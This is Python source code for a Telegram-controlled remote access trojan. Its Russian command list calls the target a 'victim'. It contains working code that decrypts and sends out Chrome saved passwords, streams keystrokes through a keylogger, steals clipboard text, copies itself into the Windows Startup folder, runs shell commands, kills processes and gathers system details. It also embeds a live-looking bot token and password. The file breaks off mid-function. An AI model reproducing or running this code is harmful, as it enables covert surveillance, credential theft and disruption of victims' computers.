import telebot
import os
import random
import pyttsx3
import pyautogui
import cv2
import json
import ctypes
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import time
import stat
import pyaudio
import wave
import browser_cookie3
import numpy as np
import shutil
from pynput import keyboard
from datetime import datetime, timedelta






try:
    bot = telebot.TeleBot('8148248722:AAE91IlztYTpgkSP66WWg6xkRKgTRp79TJ4')
except Exception as e:
    pass
#################################################################################


textovik_old = """
## 🛠️ Системные команды
- 🔌 /addstartup - Добавить ратку в автозагрузку
- 📁 /filepath - Показать полный путь ратки
- ⌨️ /keylogger - Запустить кейлоггер
- ⛔ /stopkeylogger - Остановить кейлоггер
- 👟 /run [путь_к_файлу] - Запустить файл
- 🧑🏻‍💻 /users - Показать пользователей ПК
- 🖥️ /whoami - Показать имя компьютера
- 📃 /tasklist - Показать запущенные процессы
- 🧨 /taskkill [процесс] - Завершить процесс
- 💤 /sleep - Перевести ПК в спящий режим
- 🕚 /shutdown - Выключить ПК
- 🔄 /restart - Перезагрузить ПК
- 💥 /altf4 - ALT + F4 
- 💣 /cmdbomb - Открыть 10 окон CMD
- Ⓜ️ /msg [тип] [заголовок] [текст] - Создать окно с текстом
*/msg типы(info; warning; error; question; default или 0)*
 пример: /msg error Тест "Текст ошибки" 

## 🔒 Безопасность и конфиденциальность
- 🔑 /passwords - Показать сохраненные пароли
- 🧱 /wallpaper - Изменить обои рабочего стола
- 🪦 /disabletaskmgr - Отключить диспетчер задач
- 📠 /enabletaskmgr - Включить диспетчер задач
- ☣️ /winblocker2 - Сломать винду жертве

## 📱 Управление устройством
- 📷 /screenshot - Сделать скриншот
- 🎙️ /mic [секунды] - Записать микрофон
- 📹 /webscreen - Получить снимок с камеры
- 🎦 /webcam - Получить видео с камеры
- 🎥 /screenrecord - Записать экран
- 🚫 /block - Блокировать ввод (мышь и клавиатура)
- ✅ /unblock - Разблокировать ввод
- 🖱️ /mousemesstart - Начать хаотичное движение мыши
- 🐁 /mousemesstop - Остановить движение мыши
- 🪤 /mousekill - Отключить мышь
- 🐭 /mousestop - Включить мышь
- 🖱️ /mousemove [x] [y] - Переместить курсор на координаты
- 🐁 /mouseclick - Кликнуть мышью
- 🔊 /fullvolume - Максимальная громкость
- 🔉 /volumeplus - Увеличить громкость на 10%
- 🔇 /volumeminus - Уменьшить громкость на 10%
- 🔄️ /rotate - Повернуть экран на +90°
- 🪟 /maximize - Развернуть активное окно
- 🪟 /minimize - Свернуть активное окно

## 🌐 Сетевое взаимодействие
- 🛜 /wifilist - Показать сохраненные Wi-Fi сети
- 🔐 /wifipass [сеть] - Показать пароль Wi-Fi сети
- 🌐 /chrome [URL] - Открыть сайт в Chrome
- 🌐 /edge [URL] - Открыть сайт в Edge
- 🌐 /firefox [URL] - Открыть сайт в Firefox

## 🎶 Мультимедиа
- 💬👂🏻 /textspech [текст] - Озвучить текст
- 🎵 /playsound [путь_к_файлу] - Воспроизвести звук (предварительно загрузите через /upload)
- 📁 /download [путь_к_файлу] - Скачать файл с ПК
- 🗃️ /upload - Загрузить файл на ПК
- 📋 /clipboard - Показать содержимое буфера обмена
- 📇 /changeclipboard [текст] - Изменить буфер обмена

## ⚙️ Продвинутые операции
- 🗡️ /e [команда] - Выполнить shell-команду (краткий вывод)
- 🏹 /ex [команда] - Выполнить shell-команду (длинный вывод)
- 📅 /metadata [путь_к_файлу] - Показать метаданные файла
- ⌨️ /keytype [текст] - Напечатать текст с клавиатуры
- ⌨️ /keypress [клавиша] - Нажать клавишу
- ⌨️ /keypresstwo [клавиша1] [клавиша2] - Нажать две клавиши
- ⌨️ /keypressthree [клавиша1] [клавиша2] [клавиша3] - Нажать три клавиши
- 🕶️ /hide - Скрыть приложение
- 👓 /unhide - Показать приложение

## 🖥️ Информация о системе
- 🪪 /info - Информация о ПК (IP, местоположение, страна, город)
- 📊 /pcinfo - Инфо об ОС, системе, CPU, версии Windows, BIOS и др.
- 💻 /shortinfo - Краткая информация о ПК
- 🛠️ /apps - Показать установленные программы
- 🔋 /batteryinfo - Информация о батарее 

## ПРИМЕРЫ:
- 📖 /examples - Показать примеры использования
"""
examplestext = """
## Examples:
- /e whoami → Результат: win-9bn5tk4e2b7\\user
- /e cd /home → Результат: Текущая директория: home
- /run C:\\Users\\user\\Pictures\\test.png → Результат: Файл успешно открыт!
- /mousemove 50 80  → Результат: Курсор перемещен на {x},{y}!
- /keypress x  → Результат: Клавиша 'x' нажата успешно!
- /msg info Тест "Привет мир" → Результат: У жертвы открылось окно с текстом! 
"""









textovik = """
## 🛠️ Системные команды
- 🔌 /addstartup - Добавить ратку в автозагрузку
- 📁 /filepath - Показать полный путь ратки
- ⌨️ /keylogger - Запустить кейлоггер
- ⛔ /stopkeylogger - Остановить кейлоггер
- 👟 /run [путь_к_файлу] - Запустить файл
- 🧑🏻‍💻 /users - Показать пользователей ПК
- 🖥️ /whoami - Показать имя компьютера
- 📃 /tasklist - Показать запущенные процессы
- 🧨 /taskkill [процесс] - Завершить процесс
- 💤 /sleep - Перевести ПК в спящий режим
- 🕚 /shutdown - Выключить ПК
- 🔄 /restart - Перезагрузить ПК
- 💥 /altf4 - ALT + F4 
- 💣 /cmdbomb - Открыть 10 окон CMD
- Ⓜ️ /msg [тип] [заголовок] [текст] - Создать окно с текстом
*/msg типы(info; warning; error; question; default или 0)*
 пример: /msg error Тест "Текст ошибки" 

## 🔒 Безопасность и конфиденциальность
- 🔑 /passwords - Показать сохраненные пароли
- 🧱 /wallpaper - Изменить обои рабочего стола
- 🪦 /disabletaskmgr - Отключить диспетчер задач
- 📠 /enabletaskmgr - Включить диспетчер задач
- ☣️ /winblocker2 - Сломать винду жертве

## 📱 Управление устройством
- 📷 /screenshot - Сделать скриншот
- 🎙️ /mic [секунды] - Записать микрофон
- 📹 /webscreen - Получить снимок с камеры
- 🎦 /webcam - Получить видео с камеры
- 🎥 /screenrecord - Записать экран
- 🚫 /block - Блокировать ввод (мышь и клавиатура)
- ✅ /unblock - Разблокировать ввод
- 🖱️ /mousemesstart - Начать хаотичное движение мыши
- 🐁 /mousemesstop - Остановить движение мыши
- 🪤 /mousekill - Отключить мышь
- 🐭 /mousestop - Включить мышь
- 🖱️ /mousemove [x] [y] - Переместить курсор на координаты
- 🐁 /mouseclick - Кликнуть мышью
- 🔊 /fullvolume - Максимальная громкость
- 🔉 /volumeplus - Увеличить громкость на 10%
- 🔇 /volumeminus - Уменьшить громкость на 10%
- 🔄️ /rotate - Повернуть экран на +90°
- 🪟 /maximize - Развернуть активное окно
- 🪟 /minimize - Свернуть активное окно

## 🌐 Сетевое взаимодействие
- 🛜 /wifilist - Показать сохраненные Wi-Fi сети
- 🔐 /wifipass [сеть] - Показать пароль Wi-Fi сети
- 🌐 /chrome [URL] - Открыть сайт в Chrome
- 🌐 /edge [URL] - Открыть сайт в Edge
- 🌐 /firefox [URL] - Открыть сайт в Firefox

## 🎶 Мультимедиа
- 💬👂🏻 /textspech [текст] - Озвучить текст
- 🎵 /playsound [путь_к_файлу] - Воспроизвести звук (предварительно загрузите через /upload)
- 📁 /download [путь_к_файлу] - Скачать файл с ПК
- 🗃️ /upload - Загрузить файл на ПК
- 📋 /clipboard - Показать содержимое буфера обмена
- 📇 /changeclipboard [текст] - Изменить буфер обмена

## ⚙️ Продвинутые операции
- 🗡️ /e [команда] - Выполнить shell-команду (краткий вывод)
- 🏹 /ex [команда] - Выполнить shell-команду (длинный вывод)
- 📅 /metadata [путь_к_файлу] - Показать метаданные файла
- ⌨️ /keytype [текст] - Напечатать текст с клавиатуры
- ⌨️ /keypress [клавиша] - Нажать клавишу
- ⌨️ /keypresstwo [клавиша1] [клавиша2] - Нажать две клавиши
- ⌨️ /keypressthree [клавиша1] [клавиша2] [клавиша3] - Нажать три клавиши
- 🕶️ /hide - Скрыть приложение
- 👓 /unhide - Показать приложение

## 🖥️ Информация о системе
- 🪪 /info - Информация о ПК (IP, местоположение, страна, город)
- 📊 /pcinfo - Инфо об ОС, системе, CPU, версии Windows, BIOS и др.
- 💻 /shortinfo - Краткая информация о ПК
- 🛠️ /apps - Показать установленные программы
- 🔋 /batteryinfo - Информация о батарее 

## ПРИМЕРЫ:
- 📖 /examples - Показать примеры использования
"""























n = False

@bot.message_handler(commands=['start'])

def start(message):
    
    if n == False:
        bot.send_message(message.chat.id, "🔐 Введите пароль: ")
        bot.register_next_step_handler(message, checkpass)
    else:
            bot.send_message(message.chat.id, "✅ Пароль верный.")
            
            result = os.popen('whoami').read().strip()
            bot.send_message(message.chat.id, f'Для списка всех команд напишите /help')
            bot.send_message(message.chat.id, f'PC жертвы: {result}')

def checkpass(message):
        if message.text == 'vedmoor':
            global n
            n = True
            bot.send_message(message.chat.id, "✅ Пароль верный.")
            result = os.popen('whoami').read().strip()
            bot.send_message(message.chat.id, f'Для списка всех команд напишите /help')
            bot.send_message(message.chat.id, f'PC жертвы: {result}')

        else:
            bot.send_message(message.chat.id, '❌ Неверный пароль')
#################################################################################    
user_state = {}

@bot.message_handler(commands=['addstartup'])
def add_startup(message):
    bot.send_message(message.chat.id, 'Введите имя вашего исполняемого файла (полный путь):')
    user_state[message.chat.id] = 'waiting_for_path'

@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == 'waiting_for_path')
def handle_executable_path(message):
    executable_path = message.text
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    
    if not os.path.exists(executable_path):
        bot.send_message(message.chat.id, 'Указанный файл не существует. Пожалуйста, попробуйте снова.')
    elif not executable_path.lower().endswith('.exe'):
        bot.send_message(message.chat.id, 'Пожалуйста, укажите действительный путь к исполняемому файлу.')
    else:
        if os.path.isdir(startup_folder):
            executable_filename = os.path.basename(executable_path)
            destination_path = os.path.join(startup_folder, executable_filename)
            try:
                shutil.copyfile(executable_path, destination_path)
                bot.send_message(message.chat.id, f'{executable_filename} успешно добавлен в автозагрузку!')
            except Exception as e:
                bot.send_message(message.chat.id, f'Ошибка при добавлении в автозагрузку: {e}')
        else:
            bot.send_message(message.chat.id, 'Папка автозагрузки не найдена.')
    
    user_state.pop(message.chat.id, None)
#################################################################################
@bot.message_handler(commands=['filepath'])
def get_file_path(message):
    try:
        fullpath = os.path.abspath(__file__)
        bot.send_message(message.chat.id, str(fullpath))
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка при добавлении в автозагрузку: {e}')
#################################################################################

@bot.message_handler(commands=['passwords'])
def send_passwords(message):

    bot.send_message(message.chat.id, "Перехват паролей...")


    key = get_encryption_key()


    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")

    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)


    db = sqlite3.connect(filename)
    cursor = db.cursor()


    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")

    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        

        
        if username or password:
            bot.send_message(message.chat.id, f"Origin URL: {origin_url}")
            bot.send_message(message.chat.id, f"Action URL: {action_url}")
            bot.send_message(message.chat.id, f"Username: {username}")
            bot.send_message(message.chat.id, f"Password: {password}")
        else:
            continue

        if date_created != 86400000000 and date_created:
            bot.send_message(message.chat.id, f"Creation date: {str(get_chrome_datetime(date_created))}")

        if date_last_used != 86400000000 and date_last_used:
            bot.send_message(message.chat.id, f"Last Used: {str(get_chrome_datetime(date_last_used))}")

        bot.send_message(message.chat.id, "=" * 50)

###################################################################


    data_to_send = ""

    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")


    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        


        if username or password:
            data_to_send += f"Origin URL: {origin_url}\n"
            data_to_send += f"Action URL: {action_url}\n"
            data_to_send += f"Username: {username}\n"
            data_to_send += f"Password: {password}\n"

        if date_created != 86400000000 and date_created:
            data_to_send += f"Creation date: {str(get_chrome_datetime(date_created))}\n"

        if date_last_used != 86400000000 and date_last_used:
            data_to_send += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"

        data_to_send += "=" * 50 + "\n\n"



    cursor.close()
    db.close()


    try:
        os.remove(filename)
    except Exception as e:
        print(f"Ошибка при удалении файла: {e}")


    if data_to_send:
        with open("passwords.txt", "w", encoding="utf-8") as file:
            file.write(data_to_send)


        with open("passwords.txt", "rb") as file:
            bot.send_document(message.chat.id, file)
    
    else:
        bot.send_message(message.chat.id, "Нет никаких паролей для их отправки.")
    os.remove('passwords.txt')
###################################################################


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
#############################################################################

@bot.message_handler(commands=['taskkill'])
def task_kill(message):

    try:
        task = message.text.split('/taskkill', 1)[1].strip()
        ss = os.popen(f'taskkill /f /im {task}').read().strip()
        bot.send_message(message.chat.id , f'{ss}')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')
#############################################################################

@bot.message_handler(commands=['msg'])
def show_message_box(message):
    try:
        keypwo = message.text.split('/msg', 1)[1].strip().split()
        msg_type = keypwo[0]
        title = keypwo[1]
        text = keypwo[2]
        
        types = {
            "info": 64,     
            "warning": 48,
            "error": 16,
            "question": 32,
            "default": 0
        }
        msg_type = types.get(msg_type, 0)  
        

        command = f'mshta vbscript:Execute("msgbox ""{text}"", {msg_type}, ""{title}"":close")'
        bot.send_message(message.chat.id, "Успешно отображен!")
        os.popen(command)
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
#############################################################################

@bot.message_handler(commands=['stopkeylogger'])
def stop_key(message):
    global end
    end = 1    
    bot.send_message(message.chat.id, "Кейлоггер остановлен!")
    
#############################################################################
@bot.message_handler(commands=['keylogger'])
def track_all_keys(message):
    try:
        bot.send_message(message.chat.id, "Кейлоггер запущен!")
        bot.send_message(message.chat.id, "Напиши: /stopkeylogger для остановки")
        global end
        end = 0
        def on_press(key):

            try:
                bot.send_message(message.chat.id, f"Нажатая клавиша: {key.char}")
            except AttributeError:
                bot.send_message(message.chat.id, f"Нажата специальная клавиша: {key}")

        def on_release(key):

            if end == 1:
                bot.send_message(message.chat.id, "Кейлогер остановлен!")
                return False

        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
#############################################################################
@bot.message_handler(commands=['clipboard'])
def get_clipboard_content(message):
    usid = message.from_user.id
    clientid = message.chat.id
    
    if usid == clientid:
        CF_TEXT = 1
        kernel32 = ctypes.windll.kernel32
        kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        kernel32.GlobalLock.restype = ctypes.c_void_p
        kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
        user32 = ctypes.windll.user32
        user32.GetClipboardData.restype = ctypes.c_void_p
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            data = user32.GetClipboardData(CF_TEXT)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            body = value.decode()
            user32.CloseClipboard()
            username = os.getlogin()
            bot.send_message(message.chat.id , f'{username} буферобмена:  {body}')


#############################################################################s
global mousekill
mousekill = 42


 
@bot.message_handler(commands=['mousestop'])
def mou(message):
    global mousekill
    mousekill = 7
    bot.send_message(message.chat.id , 'mouse kill остановлен')
 


#############################################################################
 
@bot.message_handler(commands=['mousekill'])
def mous(message):

    try:
        bot.send_message(message.chat.id , 'mouse kill запущен!')

        while mousekill != 7:
            pyautogui.moveTo(500,500)
            #time.sleep(1)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')

#############################################################################

global mousemess
mousemess = 42

#############################################################################
 
@bot.message_handler(commands=['mousemesstop'])
def moust(message):
    global mousemess
    mousemess = 7
    bot.send_message(message.chat.id , 'mouse mess остановлен!')
 
 

#############################################################################
 
@bot.message_handler(commands=['mousemesstart'])
def mous(message):

    try:
        bot.send_message(message.chat.id , 'mouse mess остановлен!')

        while mousemess != 7:
            x=random.randint(666, 999)
            y=random.randint(666, 999)
            pyautogui.moveTo(x, y, 7)
            time.sleep(1)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')

#############################################################################

@bot.message_handler(commands=['keytype'])
def keytyp(message):
    try:
        
        text = message.text.split('/keytype' , 1)[1].strip()
        
        pyautogui.write(text)

    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')



###################################################################

@bot.message_handler(commands=['mousemove'])
def mousemove(message):
    try:
        cordinates = message.text.split('/mousemove', 1)[1].strip().split()
        x = int(cordinates[0])
        y = int(cordinates[1])
        
        pyautogui.moveTo(x, y)
    
        bot.send_message(message.chat.id , f'Указатель мыши успешно переместился на координаты {x} и {y}!')
    
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')
        
        
###################################################################

@bot.message_handler(commands=['mouseclick'])
def mousemove(message):
    try:
        
        pyautogui.click()

        bot.send_message(message.chat.id , 'КЛик сделан!')
    
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')
#############################################################################

@bot.message_handler(commands=['keypress'])
def keyprs(message):
 
    keys = ['!', '"', '#', '$', '%', '&', "'", '(',
    ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
    'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
    'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
    'browserback', 'browserfavorites', 'browserforward', 'browserhome',
    'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
    'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
    'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
    'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
    'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
    'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
    'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
    'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
    'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
    'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
    'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
    'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
    'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
    'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
    'command', 'option', 'optionleft', 'optionright']

    try:

        bot.send_message(message.chat.id , '(/keypress win) Вы можете использовать эти клавиши::')
        bot.send_message(message.chat.id , str(keys))

        keypr = message.text.split('/keypress', 1)[1].strip()
        pyautogui.press(keypr) 
        bot.send_message(message.chat.id , f'\'{keypr}\' клавиша была нажата успешно!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  


#############################################################################        




@bot.message_handler(commands=['keypresstwo'])
def keyprs(message):
 
    keys = ['!', '"', '#', '$', '%', '&', "'", '(',
    ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
    'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
    'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
    'browserback', 'browserfavorites', 'browserforward', 'browserhome',
    'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
    'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
    'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
    'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
    'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
    'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
    'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
    'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
    'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
    'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
    'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
    'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
    'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
    'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
    'command', 'option', 'optionleft', 'optionright']

    try:

        bot.send_message(message.chat.id , '(/keypresstwo win r) Ты можешь нажимать эти клавиши')
        bot.send_message(message.chat.id , str(keys))

        keypwo = message.text.split('/keypresstwo', 1)[1].strip().split()
        key1 = keypwo[0]
        
        key2 = keypwo[1]

        pyautogui.hotkey(key1, key2)
        bot.send_message(message.chat.id , f'Клавиша нажата успешна!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  
        
#############################################################################        


@bot.message_handler(commands=['keypressthree'])
def keyprs(message):
 
    keys = ['!', '"', '#', '$', '%', '&', "'", '(',
    ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
    'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
    'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
    'browserback', 'browserfavorites', 'browserforward', 'browserhome',
    'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
    'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
    'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
    'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
    'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
    'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
    'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
    'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
    'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
    'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
    'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
    'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
    'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
    'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
    'command', 'option', 'optionleft', 'optionright']

    try:
        bot.send_message(message.chat.id , '(/keypressthree ctrl alt esc) Ты можешь нажимать эти клавиши:')
        bot.send_message(message.chat.id , str(keys))

        keypwo = message.text.split('/keypressthree', 1)[1].strip().split()
        key1 = keypwo[0]
        
        key2 = keypwo[1]
        
        key3 = keypwo[2]

    
        pyautogui.hotkey(key1, key2 , key3)
        bot.send_message(message.chat.id , f'Клавиша была успешна нажата!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  

#############################################################################
@bot.message_handler(commands=['apps'])
def apps(message):
    try:
        res = os.popen('wmic product get Name, Version , Vendor').read().strip()
        
        lines = res.splitlines()
        
        chunk_size = 30
        chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
     
        for chunk in chunks:
            bot.send_message(message.chat.id, "\n".join(chunk).strip())

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")
        
#############################################################################
@bot.message_handler(commands=['pcinfo'])
def pcinfo(message):
    try: 
        # prop = os.popen('wmic computersystem list brief').read().strip()
        # ver = os.popen('wmic computersystem list brief').read().strip()
        # bios = os.popen('wmic bios get Manufacturer, Version, ReleaseDate, SerialNumber, SMBIOSBIOSVersion').read().strip()
        # cpu = os.popen('wmic cpu get Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Manufacturer, Caption').read().strip()
        # ram = os.popen('wmic memorychip get Capacity, Manufacturer, MemoryType, Speed, PartNumber, DeviceLocator').read().strip()
        # diskdrive = os.popen('wmic diskdrive get Model, Size, SerialNumber, MediaType, InterfaceType, Status').read().strip()
        # osinfo = os.popen('wmic os get Caption, Version, OSArchitecture, BuildNumber, RegisteredUser, SerialNumber, InstallDate').read().strip()
        # networkadapter = os.popen('wmic nicconfig get Description, MACAddress, IPAddress, DefaultIPGateway, DNSHostName, ServiceName').read().strip()
        # bot.send_message(message.chat.id , f"pc properties: {prop}")
        # bot.send_message(message.chat.id , f"pc's os version: {ver}")
        # bot.send_message(message.chat.id , f"pc bios: {bios}")
        # bot.send_message(message.chat.id , f"cpu: {cpu}")
        # bot.send_message(message.chat.id , f"ram: {ram}")
        # bot.send_message(message.chat.id , f"diskdrive: {diskdrive}")
        # bot.send_message(message.chat.id , f"os: {osinfo}")
        # bot.send_message(message.chat.id , f"network adapter: {networkadapter}")    

        prop = os.popen('wmic computersystem list brief').read().strip()
        ver = os.popen('wmic computersystem list brief').read().strip()
        bios = os.popen('wmic bios get Manufacturer, Version, ReleaseDate, SerialNumber, SMBIOSBIOSVersion').read().strip()
        cpu = os.popen('wmic cpu get Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Manufacturer, Caption').read().strip()
        ram = os.popen('wmic memorychip get Capacity, Manufacturer, MemoryType, Speed, PartNumber, DeviceLocator').read().strip()
        diskdrive = os.popen('wmic diskdrive get Model, Size, SerialNumber, MediaType, InterfaceType, Status').read().strip()
        compsysinfo = os.popen('wmic computersystem get Model, Manufacturer, TotalPhysicalMemory, Domain, Username, SystemType, NumberOfProcessors').read().strip()
        osinfo = os.popen('wmic os get Caption, Version, OSArchitecture, BuildNumber, RegisteredUser, SerialNumber, InstallDate').read().strip()
        networkadapter = os.popen('wmic nicconfig get Description, MACAddress, IPAddress, DefaultIPGateway, DNSHostName, ServiceName').read().strip()
        minios = os.popen('wmic os get /format:list').read().strip()

        def send_long_message(chat_id, title, content):
            lines = content.splitlines()
            chunk_size = 30  
            chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
            
            for idx, chunk in enumerate(chunks):
                bot.send_message(chat_id, f"{title} (part {idx + 1}):\n" + "\n".join(chunk))
        send_long_message(message.chat.id, "PC Properties", prop)
        send_long_message(message.chat.id, "PC OS Version", ver)
        send_long_message(message.chat.id, "PC BIOS", bios)
        send_long_message(message.chat.id, "CPU Info", cpu)
        send_long_message(message.chat.id, "RAM Info", ram)
        send_long_message(message.chat.id, "Computer Info" , compsysinfo)
        send_long_message(message.chat.id, "Disk Drive Info", diskdrive)
        send_long_message(message.chat.id, "OS Info", osinfo)
        send_long_message(message.chat.id, "Network Adapter Info", networkadapter)
        bot.send_message(message.chat.id, f"System Info: {minios}")


    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  
                
                
#################################################################################
@bot.message_handler(commands=['batteryinfo'])
def batteryinfo(message):
    try:
        # wmic path Win32_Battery get EstimatedChargeRemaining, BatteryStatus, FullChargeCapacity,Status
        batstatus = os.popen('wmic path Win32_Battery get BatteryStatus').read().strip()
        bates = os.popen('wmic path Win32_Battery get EstimatedChargeRemaining').read().strip()
        batname = os.popen('wmic path Win32_Battery get name').read().strip()
        batsysname = os.popen('wmic path Win32_Battery get SystemName').read().strip()
        bot.send_message(message.chat.id, '''В состоянии батареи. каждое число соответствует определенному состоянию батареи.
                                Вот значения:
                         
                         1 - Батарея разряжается
                         2 - Батарея заряжается
                         3 - Батарея полностью заряжена
                         4 - Уровень заряда батареи низкий
                         5 - Уровень заряда батареи критический
                         6 - Аккумулятор заряжается и скоро будет полностью заряжен.
                         7 - Уровень заряда равен нулю''')

